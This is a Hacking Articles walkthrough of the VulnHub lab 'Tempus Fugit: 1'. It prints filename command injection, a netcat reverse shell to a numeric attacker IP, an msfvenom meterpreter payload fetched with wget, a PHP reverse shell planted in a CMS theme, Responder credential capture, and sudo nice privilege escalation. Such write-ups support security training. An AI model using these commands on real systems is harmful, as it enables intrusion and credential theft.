<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Tempus Fugit: 1: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/tempus-fugit-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-02-18T17:47:14+00:00">February 18, 2020</time><time class="updated" datetime="2025-06-10T20:10:43+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to crack the Tempus Fugit: 1 Capture the Flag Challenge and present a detailed walkthrough. The machine depicted in this Walkthrough is hosted on Vulnhub. Credit for making this machine goes to <a style="color: #000000;" href="https://twitter.com/4nqr34z">4nqr34z</a> and <a style="color: #000000;" href="https://twitter.com/DCAU7">DCAU</a>. Download this lab by clicking <a style="color: #000000;" href="https://www.vulnhub.com/entry/tempus-fugit-1,346/">here</a>.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Hard/Insane</span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
<ul>
<li><span style="color: #000000;">Netdiscover Scan</span></li>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Enumeration</strong></span>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service in Browser</span></li>
<li><span style="color: #000000;">User Enumeration using Command Injection</span></li>
<li><span style="color: #000000;">Getting netcat session using Command Injection</span></li>
<li><span style="color: #000000;">Enumerating Cgroup for Dockers</span></li>
<li><span style="color: #000000;">Enumerating FTP service for CMS Credentials</span></li>
<li><span style="color: #000000;">Installing Nmap On Target Machine</span></li>
<li><span style="color: #000000;">Nmap Scan</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Crafting Payload using MSFvenom</span></li>
<li><span style="color: #000000;">Transferring Payload to Target Machine</span></li>
<li><span style="color: #000000;">Getting Meterpreter Session</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Post Exploitation</strong></span>
<ul>
<li><span style="color: #000000;">Port Forwarding using portfwd</span></li>
<li><span style="color: #000000;">Enumeration of /etc/hosts on Target Machine</span></li>
<li><span style="color: #000000;">Installing Bind Tools</span></li>
<li><span style="color: #000000;">Enumerating using DiG</span></li>
<li><span style="color: #000000;">Adding CMS URL in attacker’s /etc/hosts</span></li>
<li><span style="color: #000000;">Accessing the CMS</span></li>
<li><span style="color: #000000;">Exploiting CMS using a Theme template</span></li>
<li><span style="color: #000000;">Getting Session for www-data</span></li>
<li><span style="color: #000000;">Getting Credentials using Responder</span></li>
<li><span style="color: #000000;">Enumerating the mails of the user</span></li>
<li><span style="color: #000000;">Getting credentials of another user</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
<ul>
<li><span style="color: #000000;">Enumerating for Sudoers List</span></li>
<li><span style="color: #000000;">Escalating Privilege using nice</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Reading Root Flag</strong></span></li>
</ul>
<h3><span style="color: #000000;"><strong>Walkthrough</strong></span></h3>
<h3><span style="color: #800000;"><strong>Network Scanning </strong></span></h3>
<p><span style="color: #000000;">We downloaded, imported and ran the virtual machine (.ova) on the VMWare Workstation, the machine will automatically be assigned an IP address from the network DHCP. To begin we will find the IP address of our target machine, for that use the following command as it helps to see all the IP’s in an internal network:</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-3QNW0mN_LOY/XkwbJflmPCI/AAAAAAAAitg/v6jWKe2MRew4dCUJDiqYkqxagntMD098gCLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">We found the target’s IP Address 192.168.43.100. The next step is to scan the target machine by using the Nmap tool. This is to find the open ports and services on the target machine and will help us to proceed further</span></p>
<pre class="lang:default decode:true ">nmap -A 192.168.43.100</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Py5GKI19MQU/XkwbM2zpg-I/AAAAAAAAiuE/pqplrjhg1cAcYl-akI6tj6ZFV2COipDZQCLcBGAsYHQ/s1600/2.png"/></p>
<h3><span style="color: #800000;"><strong>Enumeration </strong></span></h3>
<p><span style="color: #000000;">Here, we performed an Aggressive scan to gather maximum information in a single step. The scan revealed that we only have the TCP port 80 opened. It was running the Nginx server which is hosting the HTTP service. As for the lack of better option let’s get on to enumerate the port 80.</span></p>
<pre class="lang:default decode:true ">http://192.168.43.100</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-TcKF5WZXRPg/XkwbROaTL6I/AAAAAAAAiuw/1xA68ifJcAE00lAS1BZ8tlESqUnI9nPUgCLcBGAsYHQ/s1600/3.png"/></p>
<p><span style="color: #000000;">We have a very nice site, which looked like it is made of some popular CMS but, all my hard work exploring the webpage didn’t yield any benefit. But we did find this message.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-eWGICYUI0tI/XkwbUnAsTJI/AAAAAAAAivc/fR35UIsyY5oE8E2RNxKMQIundGnsTxK6QCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">It was in the About section, it tells us the meaning of the word Tempus Fugit which really translates to “Time Flies”. The message also informs that this webpage was designed to upload some scripts onto an internal FTP server. Now all we need to find that upload option. It was on the menu of the webpage. After enumerating for a while, it was clear that this upload option was white-listed. Only .txt and .rtf extensions were allowed. After an exhaustive list of ways to upload any kind of shell but we were unsuccessful. Now it hit us that we could try command injection through this upload option. We tried the very basic injection with “;whoami”. For this we intercepted the request on the “Upload!” and added the injection text in the filename field as shown in the image given below. After this, we forwarded the request to the Target Machine Server.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-c0SnpQfjq1I/XkwbVHVmSLI/AAAAAAAAivk/woqw8oDWRaQ7G_h6NMKnp3YhokNiwpqRACLcBGAsYHQ/s1600/5.png"/></p>
<pre class="lang:default decode:true">http://192.168.43.100/upload
test.txt;whoami</pre>
<p><span style="color: #000000;">It’s good news! The injection was successful. We get a reply “root”. Now the next logical step is to enumerate around the application.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-J_Pauw5Ools/XkwbVVyIzzI/AAAAAAAAivo/0AnOaRNQF3sr3ikp-e-XEdQv6WilHwBUwCLcBGAsYHQ/s1600/6.png"/></p>
<p><span style="color: #000000;">For enumeration, we thought that Directory Listing is a good way. So, we replaced “;whoami” injection to “;ls”. After performing the ls command injection, we see that we have all the files in the directory listed. This was a pretty consolidated format. But we clearly saw that there was a file named main.py. This must be important.</span></p>
<pre class="lang:default decode:true">test.txt;ls</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YasqIAHQZWI/XkwbV_eE87I/AAAAAAAAivs/_VeGAmXKKrALwxsDPHpF2IFe0nmZqza-gCLcBGAsYHQ/s1600/7.png"/></p>
<p><span style="color: #000000;">We tried to read the main.py file using the cat command. We get an error “Only RTF and TXT files are allowed”. We deduced from this is that the filter is not allowing “.py” in the injection as well. So, to work around this filter, we thought to try the wildcard option (*).</span></p>
<pre class="lang:default decode:true ">test.txt;cat main*</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-b4DR6o2Etg0/XkwbW6MGHCI/AAAAAAAAiv0/8f-iZW5EsF8QKf_hYppH0OknozY9wVp2QCLcBGAsYHQ/s1600/8.png"/></p>
<p><span style="color: #000000;">It worked! We were able to read the main.py file. It was the internal FTP server that is working on the backend. On taking a closer look we see that we have a username and a hash which looks like MD5.</span></p>
<pre class="lang:default decode:true ">someuser
b232a4da4c104798be4613ab76d26efda1a04606</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-LUtcVJgBDNA/XkwbW9IGWsI/AAAAAAAAivw/JpqeqQQjs40iQ6h0ilbRXeMuyMxsbe7FgCLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">Now, we cannot proceed further without a proper shell to work. But as we figured out earlier that the dot (.) is also blacklisted. We went on to the internet to find the representation of IP Address without the dot. We came across Long IP. So, we thought of trying to gain the session using the Long IP format of our attacker IP. The conversion to Long IP was not difficult, there were many converters available online.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-5Bs6Q8_egjI/XkwbJZZLeFI/AAAAAAAAitk/nPzYESfJB_ooPDpcITJKkXMlCZVh15sMACLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;">Now using the command injection, we found earlier, we entered a netcat invocation shell command. This command invoked a shell on port 6666 on our attacker machine.</span></p>
<pre class="lang:default decode:true ">test.txt;nc 3232246747 6666 -e sh</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Kx0ciaWKeVA/XkwbJeNhxvI/AAAAAAAAito/BB_ALLazJhwrniobFmCMIdsJ6gvziG_XQCLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;">We started a Listener before executing the command to invoke a shell. After execution, we get the shell. But to convert the improper shell into TTY shell, we used the python one-liner. Now that we have the TTY shell, we ran the whoami command which told us that we are the root user.</span></p>
<pre class="lang:default decode:true">nc -lvp 6666
python -c 'import pty; pty.spawn("/bin/sh")'
whoami
bash</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Mj-wgjtXRQA/XkwbKt6jAmI/AAAAAAAAitw/7K6UwbF7J7YuA9OvCj442TQVMZ7j5oafQCLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">Now we knew that this was not that easy. So, we went straight up to the root directory. Here we see that we have a text file named message.txt. We read the contents of the message.  As expected, it tells us that we are not done yet.</span></p>
<pre class="lang:default decode:true ">cd /root
ls
cat message.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-euI58xci2k0/XkwbKnnGyRI/AAAAAAAAits/IcrOPRpxnQoj1MOozzQ91m586mOBxaxzgCLcBGAsYHQ/s1600/15.png"/></p>
<p><span style="color: #000000;">Now we started to enumerate the other directories that are available for us in search of some hint to move forward. We used the ls command in the root directory which revealed a folder named .ncftp. We decided to take a look at it. Inside it, we found some files, in which trace.234 file revealed some information that was worth looking into. We saw that there was an IP Address that didn’t seem to be part of our subnet. There were attempts to connect to that particular IP Address.</span></p>
<pre class="lang:default decode:true ">ls -la
cd .ncftp
ls -la
cat trace.234</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-gyl9uIKGHSs/XkwbK7LmS4I/AAAAAAAAit0/ln23KBUvdFMTgx2O4mnYOCb84P69FUFogCLcBGAsYHQ/s1600/16.png"/></p>
<p><span style="color: #000000;">At this moment it hit us that, as we are root and there are multiple IP Addresses involved. It is possible that we are in a docker environment. So, to confirm that we tried to read the proc cgroup file. As expected, we are indeed in a docker environment. As we know that we can run the netcat in this environment, and we found a new IP Address inside an NcFTP directory. We had a hunch that the IP Address we found must be running an NcFTP service. To confirm, we ran a port scan using the netcat on the IP Address we found as shown in the image given below.</span></p>
<pre class="lang:default decode:true ">cat /proc/1/cgroup
nc -zv 172.19.0.12 21</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-iSFallsIDUc/XkwbL-xEOdI/AAAAAAAAit4/ojnpLoZ47bcBn59JVR49zAqZ_F36XnmIwCLcBGAsYHQ/s1600/17.png"/></p>
<p><span style="color: #000000;">Our port scan reveals that the IP Address we found is running an FTP service on port 21. We used the lftp command to login into the FTP service. We used the credentials that we found in the main.py earlier. Now, we found a hash in the main.py. We decoded it and it came out to be “mofo”. We tried that as a password. But it wasn’t a success. So, we tried the hash as a password. That worked and we were inside the FTP Server.  Now in the FTP server, we found a cmscreds.txt file. In this file, we have a set of credentials that would help us logging into a CMS but the location of CMS still remains a mystery.</span></p>
<pre class="lang:default decode:true ">lftp someuser@172.19.0.12
b232a4da4c104798be4613ab76d26efda1a04606
ls
cat cmscreds.txt
Admin
hardEnough4u</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IW4Wm8udeXw/XkwbMSUnluI/AAAAAAAAiuA/OZT_HwElWTY3DPiKQlEAa7IUkfDRTivYQCLcBGAsYHQ/s1600/18.png"/></p>
<p><span style="color: #000000;">We went back to the root directory where we found the .ncftp directory. Here we found a file named .python_history. Anything that is hidden, and is named history is worth looking into. So, we dig in to find a set of credentials. But wait there is more. We have an IP Address that is mentioned inside the code. We see that this seems to be out on a different subnet. But definitely requires investigation.</span></p>
<pre class="lang:default decode:true">ls -la
cat .python_history
someuser
myD3#2p$a%s&amp;s</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DT7S6jWvcvw/XkwbMGBUVbI/AAAAAAAAit8/gTsl97SaCes-bulO3PX84FzmiX32jbHogCLcBGAsYHQ/s1600/19.png"/></p>
<p><span style="color: #000000;">Now, although we have the standard netcat method to scan for active ports, we need something more powerful. Nmap. I checked if we have Nmap installed on this machine. But it wasn’t. Then it hit us, that we are root. So, if there is something that is not installed, we can install it. I tried apt install Nmap but that gave back an error. So, I investigated on the flavour of the Linux that we have here. Then while we were reviewing our steps, there we saw that when we read the file named trace.234. It tells us that our Target is running Alpine Linux 3.7. That’s quite helpful. This means that we will have to run the apk add command to get Nmap installed. Now as we are surrounded by multiple IP Address that is only accessible through the target machine. We went on the mission to find all the IP Address that is in question by scanning the whole subnet for available IP Addresses. This gave us a total of 4 IP Addresses.</span></p>
<pre class="lang:default decode:true ">apk add nmap
nmap -sn 172.19.0.0/16</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-BDHvaNL6CXc/XkwbNP1HoNI/AAAAAAAAiuI/Rrizv3cGg2glNmNjcRjlExeXAvVdysP7wCLcBGAsYHQ/s1600/20.png"/></p>
<p><span style="color: #000000;">We decided to start with the 172.19.0.1 and we saw that it has the port 22, 80 and 8080 open. And we have some sort of Proxy running on the system. Now whenever we come across a proxy, we know we have to use port forwarding to get through. There are multiple ways to do this. But we prefer using Metasploit. For this, we will have to gain a meterpreter session on the system.</span></p>
<pre class="lang:default decode:true">nmap 172.19.0.1</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-UrNwtfSE2a4/XkwbNLCu0HI/AAAAAAAAiuM/MuWX-aMxChA0bTkZ2s6eBZqiuMlaJZU5ACLcBGAsYHQ/s1600/21.png"/></p>
<h3><span style="color: #800000;"><strong>Exploitation </strong></span></h3>
<p><span style="color: #000000;">To gain meterpreter, we first need to craft a payload. We used the msfvenom for this task. As the target machine was running Alpine Linux. We decided to craft the payload in .elf format. After creating the payload, we use the python one line to host the payload on the port 80 in order to transfer the payload from our attacker machine to target machine.</span></p>
<pre class="lang:default decode:true ">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.43.219 lport=1234 -f elf &gt; payload.elf
python -m SimpleHTTPServer 80</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-r6QGXmnXwRw/XkwbNSYBr0I/AAAAAAAAiuQ/XYI2lfORnEM4lwHKIKGgX_Pzs7ZSCYEHACLcBGAsYHQ/s1600/22.png"/></p>
<p><span style="color: #000000;">Now, onto the session that we have of the target machine. We used wget to download the payload file to the target machine. Now we need to give proper permissions to the payload so that it can be executed easily.</span></p>
<pre class="lang:default decode:true ">wget http://192.168.43.219/payload.elf
chmod 777 payload.elf</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-EoRJFVA3m1A/XkwbOUr7kXI/AAAAAAAAiuU/m5THtMKWaS8ficZ1Jg_G_9tJ3NzTYfh6ACLcBGAsYHQ/s1600/23.png"/></p>
<h3><span style="color: #800000;"><strong>Post Exploitation </strong></span></h3>
<p><span style="color: #000000;">After giving proper permissions, we execute the elf file. After execution, we see that we have the meterpreter session on our attacker machine. Now, we used the portfwd command to forward the 8080 port of the internal IP to our attacker machine i.e., Kali Linux.</span></p>
<pre class="lang:default decode:true ">portfwd add -l 8080 -p 8080 -r 172.19.0.1</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-4pgrYlk6E9E/XkwbOfhAmEI/AAAAAAAAiuY/m2Ik5n2GNeQcvDVFOFWD7bD9W7boutExwCLcBGAsYHQ/s1600/24.png"/></p>
<p><span style="color: #000000;">We tried to access the CMS but we were not successful. This means that some more enumeration is required. We went back to our shell on the target machine and started to look around. As the CMS was not accessible, we thought to take a look at the etc directory for any hosts. Here we found “sid” mapped to the IP Address of CMS. We looked inside the resolve.conf and found “mofo.pwn” written.</span></p>
<pre class="lang:default decode:true">ls /etc/
cat /etc/hosts
cat /etc/resolv.conf</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-hKR3OSJcmqk/XkwbOk2XGhI/AAAAAAAAiuc/4oZSecoIsagypJjRhhBytgZGAzjQbu8HQCLcBGAsYHQ/s1600/25.png"/></p>
<p><span style="color: #000000;">It was quite possible this might be the host that would lead us to the CMS. To confirm our suspicions, we decided to use the bind tools. As they were not installed, we used the apk add command to install those. After that, we ran the dig command and found the host that we were looking for. ourcms.mofo.pwn seems to be the host that would take us to the CMS that we need.</span></p>
<pre class="lang:default decode:true ">apk add bind-tools
dig axfr mofo.pwn</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-H72VtPvltlM/XkwbPR7m6WI/AAAAAAAAiug/xo6-cBcfZ9oSo0qvOFKspG064VTwOFr3wCLcBGAsYHQ/s1600/26.png"/></p>
<p><span style="color: #000000;">Since the Tempus Fugit original webpage is still running on the target IP Address, we need to kill that process in order to access this CMS. We ran the netstat command and found that Nginx running with the PID 9. So, we killed it.</span></p>
<pre class="lang:default decode:true">netstat -ntlp
kill 9</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-wNqCT-oSWrA/XkwbP4OmXyI/AAAAAAAAiuk/ZXkFCU7oEL4NI7ja_Ssu2ExchSF2E1Q9gCLcBGAsYHQ/s1600/27.png"/></p>
<p><span style="color: #000000;">Now to access the CMS, we need to add that host we found in our i.e., Kali’s /etc/hosts file.</span></p>
<pre class="lang:default decode:true">cat /etc/hosts</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-sEAX0Y5WUV4/XkwbP3_rwKI/AAAAAAAAiuo/nKYANC2lALEP9ENMtqpWoamp7ByWOYQdQCLcBGAsYHQ/s1600/28.png"/></p>
<p><span style="color: #000000;">Now, all that left is to access the CMS from our browser. As we forwarded the port. We will access the webpage on 8080.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-aU2-ygloEQc/XkwbQnl93mI/AAAAAAAAius/qTADqYuyAHMGZbVw4Add7YzSApRNz1NqwCLcBGAsYHQ/s1600/29.png"/></p>
<p><span style="color: #000000;">Finding the admin login panel was quite easy and if we remember correctly, we have the credentials for this CMS.</span></p>
<pre class="lang:default decode:true">http://ourcms.mofo.pwn:8080
http://ourcms.mofo.pwn:8080/admin/
Admin
hardEnough4u</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-0urk0Hxt500/XkwbRJIChVI/AAAAAAAAiu0/937wmfQrWOwf7oFcUoOUfRubTirV5HyVgCLcBGAsYHQ/s1600/30.png"/></p>
<p><span style="color: #000000;">After logging in the CMS, we went to the Themes Section. Themes are mostly designed in PHP format and those are easier to edit and gain a shell. We edited the Innovation Theme’s template file.</span></p>
<pre class="lang:default decode:true ">http://ourcms.mofo.pwn:8080/admin/theme-edit.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-FpR8t_0NA3E/XkwbRt2PJCI/AAAAAAAAiu4/_1r5n_2xNVEsHeQJDFdO7RaM8eN8m6jOACLcBGAsYHQ/s1600/31.png"/></p>
<p><span style="color: #000000;">We replaced the contents of the template.php file with the PHP reverse shell payload and edited the IP Address and the port as shown in the image given below.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-2wVY4N2LU4k/XkwbSH2hg7I/AAAAAAAAiu8/DOosON43SGMRmEAtUWgGuDDtTp1ogkp9QCLcBGAsYHQ/s1600/32.png"/></p>
<p><span style="color: #000000;">Now before saving and accessing the template from the URL provided. We ran a netcat listener to receive the session that would be generated by the reverse shell payload upon execution. The shell popped up. We ran the whoami command and found that we are www-data user. Now we need to escalate privilege from here.</span></p>
<pre class="lang:default decode:true">nc -lvp 8888
whoami</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-kVcxJNqCxps/XkwbSdhe_SI/AAAAAAAAivA/jvzh0pyoB_gvcg_tT1Ut1MJnaeKMp26MwCLcBGAsYHQ/s1600/33.png"/></p>
<p><span style="color: #000000;">Here we were stuck for a bit, there was almost no hint possible and we were left with enumeration. Here we contacted the author and got the hint that Wireshark would be helpful. If Wireshark is helpful it means that there must be some queries in the network. We ran the Wireshark to find some DNS queries in the network but to get some credentials we need the responder tool. We ran the responder and let it work for a while in the network. After a while, we got some credentials. It was for the user roxi.</span></p>
<pre class="lang:default decode:true ">responder -I eth0</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-o75r6GhGG10/XkwbSrd5peI/AAAAAAAAivE/izeIj8n8Z7APfiaSnBaXmJ_dl1fK1YUxQCLcBGAsYHQ/s1600/34.png"/></p>
<p><span style="color: #000000;">We used the su command to login as roxi.</span></p>
<pre class="lang:default decode:true ">su roxi
scooby
python -c 'import pty; pty.spawn("/bin/sh")'</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-nIPHL1TxFzw/XkwbTLDQM7I/AAAAAAAAivI/pMt4CzoLsKATQzjlg5KAiqbFSqsNs_vzwCLcBGAsYHQ/s1600/35.png"/></p>
<p><span style="color: #000000;">We started our enumeration for this user roxi. We see that this user has some mails.</span></p>
<pre class="lang:default decode:true ">ls /var/
cd /var/mail
ls
cat roxi</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bBIGn2-vRfk/XkwbTfuThhI/AAAAAAAAivM/HgmLwfMcqCs0s1QrPCYScBDqd9fug7qNACLcBGAsYHQ/s1600/36.png"/></p>
<p><span style="color: #000000;">Let’s dig into that. There was some elaborate story in those emails but in the end, these mails have some credentials. It was for the user dorelia.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-n1Qd34s4lF8/XkwbTvLOvmI/AAAAAAAAivQ/ASYAM7Rzc34_gZf77wAlpvccoZbei7MqwCLcBGAsYHQ/s1600/37.png"/></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation </strong></span></h3>
<p><span style="color: #000000;">We again used the su command to login as the newly found user named dorelia. Let’s use the sudo -l command to enumerate if this user can run some application with root privileges.</span></p>
<pre class="lang:default decode:true ">su dorelia
9p4lw0r82xg5
sudo -l</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YW1Yll3__5g/XkwbUKlDC4I/AAAAAAAAivU/-3_xjDPvyDwMFSjfh3QQpYkd4wkiel0dQCLcBGAsYHQ/s1600/38.png"/></p>
<p><span style="color: #000000;">Dorelia user can run the “nice” command as the Nancy user which we suppose have the root access. We need to find more about this “nice”. We used the help parameter to get some information about this command. At last, we checked the gtfobin for the nice command and found a way to escalate privileges using the nice command. So, we ran the nice command to invoke the sh shell with the sudo command. This gave us the root privileges.</span></p>
<pre class="lang:default decode:true ">nice --help
sudo nice /bin/sh
whoami</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-K27Skm3h69c/XkwbUbojqiI/AAAAAAAAivY/tpbCZF2uM1EERdyfhV-tfMQDRYBbewiCgCLcBGAsYHQ/s1600/39.png"/></p>
<h3><span style="color: #800000;"><strong>Reading Root Flag</strong></span></h3>
<p><span style="color: #000000;">We traversed to the root directory to find the flag and we have a script here named proof.sh. We ran the script and it gave us the final flag.</span></p>
<pre class="lang:default decode:true ">cd /root/
ls
./proof.sh</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-N7TlMAqZbgI/XkwbVP0A5JI/AAAAAAAAivg/Sw3aqJ1ARAwOlR552-Eu2HRfSLkA8YF_wCLcBGAsYHQ/s1600/40.png"/></p>
<p><span style="color: #000000;">This was a long tiring but learning experience, I would like to thank the lab authors for creating such a lab that helped me learn so much. Also, I would like to thank <a style="color: #000000;" href="https://twitter.com/LiddellDev">Erik</a> for his help.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
